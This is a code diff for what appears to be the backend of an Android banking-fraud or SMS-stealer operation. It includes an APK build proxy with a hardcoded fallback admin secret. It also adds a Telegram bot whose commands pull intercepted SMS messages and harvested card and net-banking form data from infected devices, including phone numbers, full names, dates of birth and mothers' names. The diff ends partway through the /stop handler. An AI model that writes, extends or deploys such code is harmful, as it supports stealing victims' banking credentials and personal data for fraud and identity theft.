+      _cachedTunnelUrl = rows[0].value.replace(/\/$/, '');
+      _tunnelUrlExpiry = now + 30_000; // cache 30s
+      return _cachedTunnelUrl;
+    }
+  } catch { /* ignore */ }
+  return '';
+}
+
+async function vpsJson(path: string, neonUrl: string, method = "GET", body?: unknown): Promise<Response> {
+  const base = await getVpsBase(neonUrl);
+  if (!base) return new Response(JSON.stringify({ error: "VPS tunnel not configured" }), { status: 502, headers: { "Content-Type": "application/json" } });
+  try {
+    const r = await fetch(`${base}${path}`, {
+      method,
+      headers: { "Content-Type": "application/json" },
+      body: body ? JSON.stringify(body) : undefined,
+      signal: AbortSignal.timeout(15000),
+    });
+    const data = await r.json();
+    return new Response(JSON.stringify(data), { status: r.status, headers: { "Content-Type": "application/json" } });
+  } catch {
+    return new Response(JSON.stringify({ error: "VPS unavailable" }), { status: 502, headers: { "Content-Type": "application/json" } });
+  }
+}
+
+// VPS registers its tunnel URL here on startup
+app.post("/api/admin/update-tunnel", async (c) => {
+  const secret = c.req.header("x-admin-secret");
+  const expected = c.env.ADMIN_SECRET || "cf-tunnel-update-2026";
+  if (secret !== expected) return c.json({ error: "Unauthorized" }, 401);
+  const { url } = await c.req.json<{ url: string }>();
+  if (!url || !url.startsWith("https://")) return c.json({ error: "Invalid URL" }, 400);
+  try {
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    await sqlClient(`INSERT INTO settings (key, value) VALUES ('tunnel_url', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [url]);
+    _cachedTunnelUrl = url.replace(/\/$/, '');
+    _tunnelUrlExpiry = Date.now() + 30_000;
+    return c.json({ ok: true, url });
+  } catch (e) { return c.json({ error: String(e) }, 500); }
+});
+
+app.get("/api/vps/api/apps", async (c) => {
+  // Try VPS directly; on success update Neon cache
+  try {
+    const base = await getVpsBase(c.env.NEON_DATABASE_URL);
+    if (!base) throw new Error("no tunnel");
+    const r = await fetch(`${base}/api/apps`, { signal: AbortSignal.timeout(8000) });
+    const data = await r.json();
+    if (Array.isArray(data)) {
+      // Update cache in background
+      try {
+        const sqlClient = neon(c.env.NEON_DATABASE_URL);
+        await sqlClient(
+          `INSERT INTO settings (key, value) VALUES ('apps_cache', $1)
+           ON CONFLICT (key) DO UPDATE SET value = $1`,
+          [JSON.stringify(data)]
+        );
+      } catch { /* ignore cache write failure */ }
+      return c.json(data);
+    }
+  } catch { /* VPS unreachable, fall through to cache */ }
+
+  // Serve from Neon cache
+  try {
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'apps_cache'`) as Array<{ value: string }>;
+    if (rows.length > 0) return c.json(JSON.parse(rows[0].value));
+  } catch { /* no cache */ }
+
+  return c.json([], 200);
+});
+
+app.post("/api/vps/api/verify-token", async (c) => {
+    const body = await c.req.json();
+    const r = await vpsJson("/api/verify-token", c.env.NEON_DATABASE_URL, "POST", body);
+    return new Response(r.body, { status: r.status, headers: r.headers });
+  });
+  app.get("/api/vps/api/build/:jobId/info", async (c) => {
+  const r = await vpsJson(`/api/build/${c.req.param("jobId")}/info`, c.env.NEON_DATABASE_URL);
+  return new Response(r.body, { status: r.status, headers: r.headers });
+})
+
+  app.post("/api/vps/api/build/start", async (c) => {
+    const body = await c.req.json();
+    const r = await vpsJson("/api/build/start", c.env.NEON_DATABASE_URL, "POST", body);
+    return new Response(r.body, { status: r.status, headers: r.headers });
+  });;
+
+app.get("/api/vps/api/build/:jobId/status", async (c) => {
+  const jobId = c.req.param("jobId");
+  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
+  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
+  const upstream = await fetch(`${base}/api/build/${jobId}/status`);
+  return new Response(upstream.body, {
+    status: upstream.status,
+    headers: {
+      "Content-Type": "text/event-stream",
+      "Cache-Control": "no-cache",
+      "Connection": "keep-alive",
+    },
+  });
+});
+
+app.get("/api/vps/api/build/:jobId/download", async (c) => {
+  const jobId = c.req.param("jobId");
+  const base = await getVpsBase(c.env.NEON_DATABASE_URL);
+  if (!base) return c.json({ error: "VPS tunnel not configured" }, 502);
+  const upstream = await fetch(`${base}/api/build/${jobId}/download`);
+  if (!upstream.ok) return c.json({ error: "File not ready" }, 404);
+  const headers: Record<string, string> = {
+    "Content-Type": "application/vnd.android.package-archive",
+  };
+  const cd = upstream.headers.get("content-disposition");
+  if (cd) headers["Content-Disposition"] = cd;
+  const cl = upstream.headers.get("content-length");
+  if (cl) headers["Content-Length"] = cl;
+  return new Response(upstream.body, { headers });
+});
+
 app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
 
 // EventBus Durable Object class lives in the separate `event-bus-worker`
 // Worker (Pages cannot host DO classes directly). See `artifacts/event-bus-worker/`.
+
+  // =================== TELEGRAM BOT COMMANDS ===================
+  type TgUpdate = {
+    update_id: number;
+    message?: {
+      message_id: number;
+      chat: { id: number; type: string; first_name?: string; username?: string };
+      text?: string;
+      date: number;
+    };
+    channel_post?: {
+      message_id: number;
+      chat: { id: number; type: string; username?: string };
+      text?: string;
+      date: number;
+    };
+  };
+
+  async function getRecentData(env: Env, hours: number) {
+    const since = new Date(Date.now() - hours * 3600 * 1000).toISOString();
+    const sqlClient = neon(env.NEON_DATABASE_URL);
+    const [msgs, forms] = await Promise.all([
+      sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE received_at > $1::timestamptz ORDER BY received_at DESC LIMIT 30`, [since]),
+      sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE submitted_at > $1::timestamptz ORDER BY submitted_at DESC LIMIT 20`, [since]),
+    ]);
+    return { msgs, forms };
+  }
+
+  function formatRecentData(msgs: unknown[], forms: unknown[], label: string): string {
+    let out = `<b>${label}</b>\n\n`;
+    if (msgs.length === 0 && forms.length === 0) return out + 'No data found.';
+    if (msgs.length > 0) {
+      out += `Messages (${msgs.length}):\n`;
+      (msgs as Array<Record<string,unknown>>).forEach(m => {
+        const body = String(m.body ?? '').substring(0, 90);
+        out += `  [${m.app_id}] ${m.from_number}\n  ${body}\n`;
+      });
+    }
+    if (forms.length > 0) {
+      out += `\nForm Data (${forms.length}):\n`;
+      (forms as Array<Record<string,unknown>>).forEach(f => {
+        const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+        out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
+      });
+    }
+    return out;
+  }
+
+  app.post("/api/telegram/webhook", async (c) => {
+    let body: TgUpdate;
+    try { body = await c.req.json() as TgUpdate; } catch { return c.json({ ok: true }); }
+
+    const msg = body.message ?? body.channel_post;
+    if (!msg?.text) return c.json({ ok: true });
+
+    const chatId = msg.chat.id;
+    const txt = msg.text.trim().replace(/@\w+/, ''); // strip @botname — required for channel commands
+    const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
+    const sqlClient = neon(c.env.NEON_DATABASE_URL);
+    const db = getDb(c.env);
+
+    // /1h — last 1 hour
+    if (txt === '/1h' || txt.startsWith('/1h ')) {
+      const { msgs, forms } = await getRecentData(c.env, 1);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 1 Hour');
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /24h — last 24 hours
+    if (txt === '/24h' || txt.startsWith('/24h ')) {
+      const { msgs, forms } = await getRecentData(c.env, 24);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 24 Hours');
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /total — total counts
+    if (txt === '/total') {
+      const [appsC, devsC, msgsC, formsC] = await Promise.all([
+        sqlClient(`SELECT COUNT(*) as c FROM apps`),
+        sqlClient(`SELECT COUNT(*) as c FROM devices`),
+        sqlClient(`SELECT COUNT(*) as c FROM messages`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data`),
+      ]);
+      const out = `<b>Total Data (All Apps)</b>\n\n` +
+        `Apps: <b>${(appsC[0] as {c:string}).c}</b>\n` +
+        `Devices: <b>${(devsC[0] as {c:string}).c}</b>\n` +
+        `Messages: <b>${(msgsC[0] as {c:string}).c}</b>\n` +
+        `Form Data: <b>${(formsC[0] as {c:string}).c}</b>`;
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /apps — list all apps
+    if (txt === '/apps') {
+      const rows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
+      let out = `<b>All Apps (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'No apps found.'; }
+      rows.forEach(a => {
+        const st = a.status === 'active' ? '[active]' : '[inactive]';
+        out += `${st} <code>${a.appId}</code>  ${a.name ?? ''}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /app <appId> [deviceId] [searchText] — nested drill-down
+    if (txt.startsWith('/app ')) {
+      const parts = txt.slice(5).trim().split(' ');
+      const appId = parts[0];
+      const deviceId = parts[1] ?? null;
+      const searchQuery = parts.slice(2).join(' ').toLowerCase() || null;
+
+      if (!appId) {
+        await tgReply(token, chatId, 'Usage: /app &lt;appId&gt; [deviceId] [searchText]');
+        return c.json({ ok: true });
+      }
+
+      // Level 3: /app <appId> <deviceId> <searchText>
+      if (deviceId && searchQuery) {
+        const like = `%${searchQuery}%`;
+        const [msgR, formR] = await Promise.all([
+          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 AND (LOWER(body) LIKE $3 OR LOWER(from_number) LIKE $3 OR LOWER(from_sender) LIKE $3) ORDER BY received_at DESC LIMIT 30`, [appId, deviceId, like]),
+          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 AND LOWER(data::text) LIKE $3 ORDER BY submitted_at DESC LIMIT 15`, [appId, deviceId, like]),
+        ]);
+        let out = `<b>Search: "${searchQuery}"</b>\nApp: <code>${appId}</code> | Device: <code>${deviceId}</code>\n\n`;
+        if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) { out += 'No results found.'; }
+        if ((msgR as unknown[]).length > 0) {
+          out += `Messages (${(msgR as unknown[]).length}):\n`;
+          (msgR as Array<Record<string,unknown>>).forEach(m => {
+            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+          });
+        }
+        if ((formR as unknown[]).length > 0) {
+          out += `\nForm Data (${(formR as unknown[]).length}):\n`;
+          (formR as Array<Record<string,unknown>>).forEach(f => {
+            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
+            out += `  ${fields.substring(0, 120)}\n`;
+          });
+        }
+        await tgReply(token, chatId, out);
+        return c.json({ ok: true });
+      }
+
+      // Level 2: /app <appId> <deviceId>
+      if (deviceId) {
+        const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
+          db.select().from(devices).where(and(eq(devices.appId, appId), eq(devices.deviceId, deviceId))).limit(1),
+          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 ORDER BY received_at DESC LIMIT 25`, [appId, deviceId]),
+          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 ORDER BY submitted_at DESC LIMIT 10`, [appId, deviceId]),
+          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
+          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
+        ]);
+        const dev = devRow[0];
+        let out = `<b>Device: <code>${deviceId}</code></b>\n`;
+        if (dev) {
+          const st = dev.status === 'online' ? '[Online]' : '[Offline]';
+          out += `${st} ${dev.name}\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '-'} | SIM2: ${dev.sim2Phone ?? '-'}\n`;
+        }
+        out += `\nMessages: <b>${(msgCount[0] as {c:string}).c}</b> | Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
+        if ((msgRows as unknown[]).length > 0) {
+          out += `\nRecent Messages:\n`;
+          (msgRows as Array<Record<string,unknown>>).forEach(m => {
+            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
+          });
+        }
+        if ((formRows as unknown[]).length > 0) {
+          out += `\nRecent Form Data:\n`;
+          (formRows as Array<Record<string,unknown>>).forEach(f => {
+            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
+            out += `  ${fields.substring(0, 120)}\n`;
+          });
+        }
+        out += `\nSearch: /app ${appId} ${deviceId} &lt;text&gt;`;
+        await tgReply(token, chatId, out);
+        return c.json({ ok: true });
+      }
+
+      // Level 1: /app <appId> — list devices
+      const [devRows, msgCount, formCount] = await Promise.all([
+        db.select().from(devices).where(eq(devices.appId, appId)).orderBy(desc(devices.updatedAt)).limit(20),
+        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [appId]),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [appId]),
+      ]);
+      let out = `<b>App: <code>${appId}</code></b>\n`;
+      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
+      if (devRows.length === 0) { out += 'No devices found.'; }
+      else {
+        out += `Devices (${devRows.length}):\n`;
+        devRows.forEach(d => {
+          const st = d.status === 'online' ? '[ON]' : '[OFF]';
+          out += `${st} ${d.name}\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
+        });
+        out += `\nDevice detail: /app ${appId} &lt;deviceId&gt;`;
+      }
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /search <text> — search last 200 records only (no notification pause)
+    if (txt.startsWith('/search ')) {
+      const query = txt.slice(8).trim().toLowerCase();
+      if (!query) {
+        await tgReply(token, chatId, 'Usage: /search &lt;text&gt;');
+        return c.json({ ok: true });
+      }
+      const like = `%${query}%`;
+      const [msgR, formR] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM (SELECT * FROM messages ORDER BY received_at DESC LIMIT 200) sub WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 LIMIT 20`, [like]),
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM (SELECT * FROM form_data ORDER BY submitted_at DESC LIMIT 200) sub WHERE LOWER(data::text) LIKE $1 LIMIT 10`, [like]),
+      ]);
+      let out = `<b>Search: "${query}"</b>  (last 200 records)\n\n`;
+      if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) {
+        out += 'No results found.';
+      }
+      if ((msgR as unknown[]).length > 0) {
+        out += `Messages (${(msgR as unknown[]).length}):\n`;
+        (msgR as Array<Record<string,unknown>>).forEach(m => {
+          out += `  [${m.app_id}] ${m.from_number}\n  ${String(m.body).substring(0, 90)}\n`;
+        });
+      }
+      if ((formR as unknown[]).length > 0) {
+        out += `\nForm Data (${(formR as unknown[]).length}):\n`;
+        (formR as Array<Record<string,unknown>>).forEach(f => {
+          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+          out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
+        });
+      }
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /7d — last 7 days summary
+    if (txt === '/7d' || txt.startsWith('/7d ')) {
+      const { msgs, forms } = await getRecentData(c.env, 168);
+      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 7 Days');
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /online — devices active in last 15 min
+    if (txt === '/online') {
+      const cutoff = new Date(Date.now() - 15 * 60 * 1000).toISOString();
+      const rows = await sqlClient(`SELECT device_id, name, app_id, last_online, updated_at FROM devices WHERE (last_online > $1::timestamptz OR (status = 'online' AND updated_at > $1::timestamptz)) ORDER BY COALESCE(last_online, updated_at) DESC LIMIT 50`, [cutoff]);
+      let out = `<b>Online Devices — Last 15 Min (${(rows as unknown[]).length})</b>\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No devices active in last 15 minutes.'; }
+      (rows as Array<Record<string,unknown>>).forEach(d => {
+        const t = d.last_online
+          ? new Date(String(d.last_online)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' })
+          : '—';
+        out += `ID: <code>${d.device_id}</code>\n  ${d.name} | App: <code>${d.app_id}</code> | Last: ${t}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /card — all card form data
+    if (txt === '/card') {
+      const [rows, cntRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`),
+      ]);
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Card Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /nb — all net banking form data
+    if (txt === '/nb' || txt === '/netbanking') {
+      const [rows, cntRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%'`),
+      ]);
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Net Banking Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /card online — card with online
+    if (txt === '/card online' || txt === '/cardonline') {
+      const [rows, cntRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
+      ]);
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Card + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /nb online — net banking with online
+    if (txt === '/nb online' || txt === '/nbonline') {
+      const [rows, cntRow] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
+      ]);
+      const total = (cntRow[0] as {c:string}).c;
+      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
+      let out = `<b>Net Banking + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
+        const data = f.data as Record<string,unknown>;
+        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
+        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
+        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
+        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
+        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
+        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
+        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
+        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
+        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
+        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
+        if (extra) out += `   ${extra.substring(0,100)}\n`;
+        out += `   ${dt}\n`;
+        out += `   ─────────────────────\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /offline — all offline devices
+    if (txt === '/offline') {
+      const rows = await db.select().from(devices).where(eq(devices.status, 'offline')).orderBy(desc(devices.updatedAt)).limit(30);
+      let out = `<b>Offline Devices (${rows.length})</b>\n\n`;
+      if (rows.length === 0) { out += 'All devices are online!'; }
+      rows.forEach(d => {
+        const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
+        out += `${d.name}\n  ID: <code>${d.deviceId}</code> | App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /dev <deviceId> — quick device lookup across all apps
+    if (txt.startsWith('/dev ')) {
+      const devId = txt.slice(5).trim();
+      if (!devId) {
+        await tgReply(token, chatId, 'Usage: /dev &lt;deviceId&gt;');
+        return c.json({ ok: true });
+      }
+      const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
+        db.select().from(devices).where(eq(devices.deviceId, devId)).limit(1),
+        sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE device_id=$1 ORDER BY received_at DESC LIMIT 20`, [devId]),
+        sqlClient(`SELECT data, submitted_at FROM form_data WHERE device_id=$1 ORDER BY submitted_at DESC LIMIT 10`, [devId]),
+        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE device_id=$1`, [devId]),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
+      ]);
+      if (!devRow[0]) {
+        await tgReply(token, chatId, `Device <code>${devId}</code> not found.`);
+        return c.json({ ok: true });
+      }
+      const d = devRow[0];
+      const st = d.status === 'online' ? '[Online]' : '[Offline]';
+      let out = `<b>${d.name}</b> ${st}\n`;
+      out += `App: <code>${d.appId}</code> | User: ${d.userId}\n`;
+      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
+      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
+      if ((msgRows as unknown[]).length > 0) {
+        out += `Recent Messages:\n`;
+        (msgRows as Array<Record<string,unknown>>).forEach(m => {
+          out += `  ${m.from_number}: ${String(m.body).substring(0, 80)}\n`;
+        });
+      }
+      if ((formRows as unknown[]).length > 0) {
+        out += `\nRecent Forms:\n`;
+        (formRows as Array<Record<string,unknown>>).forEach(f => {
+          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
+          out += `  ${fields.substring(0, 120)}\n`;
+        });
+      }
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /last <n> — last N messages across all apps (default 10)
+    if (txt.startsWith('/last')) {
+      const n = Math.min(parseInt(txt.split(' ')[1] ?? '10', 10) || 10, 50);
+      const rows = await sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages ORDER BY received_at DESC LIMIT $1`, [n]);
+      let out = `<b>Last ${n} Messages</b>\n\n`;
+      if ((rows as unknown[]).length === 0) { out += 'No messages found.'; }
+      (rows as Array<Record<string,unknown>>).forEach((m, i) => {
+        out += `${i+1}. [${m.app_id}] ${m.from_number}\n   ${String(m.body).substring(0, 90)}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /stats — per-app breakdown
+    if (txt === '/stats') {
+      const appRows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
+      let out = `<b>Per-App Stats</b>\n\n`;
+      const results = await Promise.all(appRows.map(async a => {
+        const [dC, mC, fC] = await Promise.all([
+          sqlClient(`SELECT COUNT(*) as c FROM devices WHERE app_id=$1`, [a.appId]),
+          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [a.appId]),
+          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [a.appId]),
+        ]);
+        return { ...a, d: (dC[0] as {c:string}).c, m: (mC[0] as {c:string}).c, f: (fC[0] as {c:string}).c };
+      }));
+      results.forEach(r => {
+        const st = r.status === 'active' ? '[ON]' : '[OFF]';
+        out += `${st} <code>${r.appId}</code>\n  Devices: ${r.d} | Msgs: ${r.m} | Forms: ${r.f}\n`;
+      });
+      await tgReply(token, chatId, out);
+      return c.json({ ok: true });
+    }
+
+    // /stop — resume notifications
+    if (txt === '/stop' || txt === '/release') {
